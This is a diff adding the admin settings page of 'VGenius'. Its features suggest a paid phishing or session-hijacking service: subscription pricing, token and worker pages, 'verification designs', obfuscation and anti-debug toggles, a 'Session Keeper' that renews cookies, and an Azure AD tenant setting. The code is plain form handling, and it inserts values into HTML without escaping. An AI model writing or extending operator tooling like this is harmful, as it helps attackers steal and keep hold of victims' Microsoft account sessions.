@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Settings – VGenius Admin</title>
+    <link rel="stylesheet" href="assets/css/admin.css">
+    <style>
+        .settings-form { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        @media (max-width: 768px) { .settings-form { grid-template-columns: 1fr; } }
+        .setting-block { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 20px; }
+        .setting-block h3 { font-family: 'JetBrains Mono', monospace; font-size: 11px; letter-spacing: 0.08em; color: var(--accent); margin-bottom: 12px; }
+        .toggle-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .toggle-row label { font-size: 13px; }
+        .btn-save { padding: 12px 30px; background: var(--accent); color: #000; border: none; border-radius: 8px; font-family: 'JetBrains Mono', monospace; font-weight: 700; cursor: pointer; margin-top: 20px; }
+    </style>
+</head>
+<body>
+<div class="app-layout">
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-brand">🔐 VGENIUS</div>
+        <nav class="sidebar-nav">
+            <a href="dashboard.html" class="nav-item">Dashboard</a>
+            <a href="users.html" class="nav-item">Users</a>
+            <a href="tokens.html" class="nav-item">Tokens</a>
+            <a href="payments.html" class="nav-item">Payments</a>
+            <a href="workers.html" class="nav-item">Workers</a>
+            <a href="templates.html" class="nav-item">Templates</a>
+            <a href="designs.html" class="nav-item">Verification Designs</a>
+            <a href="settings.html" class="nav-item active">Settings</a>
+            <a href="broadcast.html" class="nav-item">Broadcast</a>
+            <a href="feedback.html" class="nav-item">Feedback</a>
+            <a href="auditlog.html" class="nav-item">Audit Log</a>
+        </nav>
+        <div class="sidebar-footer"><button class="btn-logout" onclick="logout()">Logout</button></div>
+    </aside>
+    <main class="main-content">
+        <h1 class="page-title">System Settings</h1>
+        <div class="settings-form" id="settingsContainer"></div>
+        <button class="btn-save" onclick="saveSettings()">Save All Settings</button>
+    </main>
+</div>
+<script src="assets/js/admin.js"></script>
+<script>
+if (!localStorage.getItem('vg-admin-token')) window.location.href = 'index.html';
+let settingsData = {};
+
+async function loadSettings() {
+    const res = await fetch('/api/admin/settings', { headers: adminHeaders() });
+    settingsData = await res.json();
+    renderSettings();
+}
+
+function renderSettings() {
+    const container = document.getElementById('settingsContainer');
+    container.innerHTML = `
+        <div class="setting-block">
+            <h3>Subscription</h3>
+            <div class="form-group"><label>Price (USD)</label><input type="number" id="subPrice" value="${settingsData.subscription_price_usd || '50'}"></div>
+            <div class="form-group"><label>Duration (days)</label><input type="number" id="subDuration" value="${settingsData.subscription_duration_days || '30'}"></div>
+        </div>
+        <div class="setting-block">
+            <h3>Maintenance</h3>
+            <div class="toggle-row"><label>Maintenance Mode</label><label class="toggle-switch"><input type="checkbox" id="maintenanceMode" ${settingsData.maintenance_mode === 'true' ? 'checked' : ''}><span class="toggle-slider"></span></label></div>
+            <div class="form-group"><label>Maintenance Message</label><input type="text" id="maintenanceMsg" value="${settingsData.maintenance_message || ''}"></div>
+        </div>
+        <div class="setting-block">
+            <h3>Registration</h3>
+            <div class="toggle-row"><label>Lock Registrations</label><label class="toggle-switch"><input type="checkbox" id="lockReg" ${settingsData.registrations_locked === 'true' ? 'checked' : ''}><span class="toggle-slider"></span></label></div>
+        </div>
+        <div class="setting-block">
+            <h3>Obfuscation & Anti-Debug</h3>
+            <div class="toggle-row"><label>Enable Obfuscation</label><label class="toggle-switch"><input type="checkbox" id="obfuscation" ${settingsData.obfuscation_enabled === 'true' ? 'checked' : ''}><span class="toggle-slider"></span></label></div>
+            <div class="toggle-row"><label>Enable Anti-Debug</label><label class="toggle-switch"><input type="checkbox" id="antidebug" ${settingsData.antidebug_enabled === 'true' ? 'checked' : ''}><span class="toggle-slider"></span></label></div>
+        </div>
+        <div class="setting-block">
+            <h3>Session Keeper</h3>
+            <div class="form-group"><label>Renewal Interval (hours)</label><input type="number" id="renewInterval" value="${settingsData.renewal_interval_hours || '6'}"></div>
+            <div class="form-group"><label>Renewal Window (hours)</label><input type="number" id="renewWindow" value="${settingsData.renewal_window_hours || '6'}"></div>
+            <div class="form-group"><label>Max Renewal Attempts</label><input type="number" id="maxRenewAttempts" value="${settingsData.max_renewal_attempts || '3'}"></div>
+            <div class="form-group"><label>Cookie TTL (hours)</label><input type="number" id="cookieTTL" value="${settingsData.cookie_default_ttl_hours || '24'}"></div>
+        </div>
+        <div class="setting-block">
+            <h3>Rate Limiting</h3>
+            <div class="form-group"><label>Window (ms)</label><input type="number" id="rateWindow" value="${settingsData.rate_limit_window_ms || '900000'}"></div>
+            <div class="form-group"><label>Max Requests</label><input type="number" id="rateMax" value="${settingsData.rate_limit_max_requests || '100'}"></div>
+        </div>
+        <div class="setting-block">
+            <h3>Azure AD</h3>
+            <div class="form-group"><label>Tenant</label><input type="text" id="azureTenant" value="${settingsData.azure_tenant || 'common'}"></div>
+        </div>
+    `;
+}
+
+async function saveSettings() {
+    const newSettings = {
+        subscription_price_usd: document.getElementById('subPrice').value,
+        subscription_duration_days: document.getElementById('subDuration').value,
+        maintenance_mode: document.getElementById('maintenanceMode').checked ? 'true' : 'false',
+        maintenance_message: document.getElementById('maintenanceMsg').value,
+        registrations_locked: document.getElementById('lockReg').checked ? 'true' : 'false',
+        obfuscation_enabled: document.getElementById('obfuscation').checked ? 'true' : 'false',
+        antidebug_enabled: document.getElementById('antidebug').checked ? 'true' : 'false',
+        renewal_interval_hours: document.getElementById('renewInterval').value,
+        renewal_window_hours: document.getElementById('renewWindow').value,
+        max_renewal_attempts: document.getElementById('maxRenewAttempts').value,
+        cookie_default_ttl_hours: document.getElementById('cookieTTL').value,
+        rate_limit_window_ms: document.getElementById('rateWindow').value,
+        rate_limit_max_requests: document.getElementById('rateMax').value,
+        azure_tenant: document.getElementById('azureTenant').value,
+    };
+
+    await fetch('/api/admin/settings', {
+        method: 'PUT',
+        headers: adminHeaders(),
+        body: JSON.stringify(newSettings),
+    });
+    showToast('Settings saved.');
+}
+
+loadSettings();
+</script>
+</body>
+</html>
